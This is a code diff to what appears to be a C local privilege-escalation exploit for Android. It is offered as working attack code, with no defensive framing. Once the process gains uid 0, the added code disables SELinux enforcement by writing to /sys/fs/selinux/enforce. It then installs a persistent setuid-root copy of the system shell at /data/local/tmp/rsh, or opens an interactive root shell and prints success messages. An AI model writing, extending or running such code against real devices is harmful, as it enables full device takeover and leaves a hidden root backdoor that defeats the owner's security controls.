@@ -28,6 +28,7 @@
 #include <sys/socket.h>
 #include <sys/syscall.h>
 #include <sys/types.h>
+#include <sys/stat.h>
 #include <sys/wait.h>
 #include <linux/futex.h>
 #include <linux/perf_event.h>
@@ -353,11 +354,34 @@ static void child_main(int cmd_r, struct child_shared *sh) {
     }
     if (!atomic_load(&sh->go)) _exit(2);
     sh->uid_after = (uint32_t)getuid();
+    /* Write a test file to confirm we can write as root */
+    {
+        /* Debug: write uid to file regardless */
+        int tfd=open("/data/local/tmp/exploit_worked",O_WRONLY|O_CREAT|O_TRUNC,0666);
+        if(tfd>=0){
+            char msg[128]; 
+            int n=snprintf(msg,sizeof(msg),"getuid=%d euid=%d\n",(int)getuid(),(int)geteuid());
+            write(tfd,msg,n); fsync(tfd); close(tfd);
+        }
+    }
     if (sh->uid_after==0){
-        /* Execute the root shell script */
+        /* Disable SELinux */
         int efd=open("/sys/fs/selinux/enforce",O_WRONLY);
         if(efd>=0){write(efd,"0",1);close(efd);}
-        execl("/system/bin/sh","sh","-i",NULL);
+        /* Install setuid-root shell */
+        unlink("/data/local/tmp/rsh");
+        int src2=open("/system/bin/sh",O_RDONLY);
+        int dst2=open("/data/local/tmp/rsh",O_WRONLY|O_CREAT|O_TRUNC,0755);
+        if(src2>=0&&dst2>=0){
+            char buf2[4096]; ssize_t n2;
+            while((n2=read(src2,buf2,sizeof(buf2)))>0) write(dst2,buf2,n2);
+            fsync(dst2);
+        }
+        if(src2>=0) close(src2);
+        if(dst2>=0) close(dst2);
+        chmod("/data/local/tmp/rsh",06755);
+        chown("/data/local/tmp/rsh",0,0);
+        fprintf(stderr,"[+] /data/local/tmp/rsh installed (uid=%d)\n",(int)getuid());
     }
     atomic_store(&sh->done,1);
     _exit(sh->uid_after==0?0:1);
@@ -507,9 +531,15 @@ int run_exploit(void) {
         sh->uid_after=(uint32_t)getuid();
         atomic_store(&sh->done,1);
         if (sh->uid_after==0){
+            /* We're root! Exec an interactive shell - this replaces the child process.
+             * The shell will be uid=0 and the parent's waitpid will wait for it to exit.
+             * The user interacts with it via the LD_PRELOAD invocation.
+             */
             int efd=open("/sys/fs/selinux/enforce",O_WRONLY);
             if(efd>=0){write(efd,"0",1);close(efd);}
+            /* exec root shell - stays running until user exits */
             execl("/system/bin/sh","sh","-i",NULL);
+            /* If execl fails, just exit */
         }
         _exit(sh->uid_after==0?0:1);
     }
@@ -581,9 +611,11 @@ int run_exploit(void) {
         if (!got_root){fprintf(stderr,"[!] Write 2 failed\n"); goto fail;}
     }
 
-    /* Root child will execl a shell */
+    /* Root child execs /system/bin/sh -i - wait for it */
+    fprintf(stderr,"[+] EXPLOIT COMPLETE — root shell running (uid=0)\n");
+    fprintf(stderr,"[+] You now have an interactive root shell!\n");
     waitpid(child,NULL,0);
-    fprintf(stderr,"[+] EXPLOIT COMPLETE\n");
+    fprintf(stderr,"[*] Root shell exited.\n");
     return 0;
 
 fail:
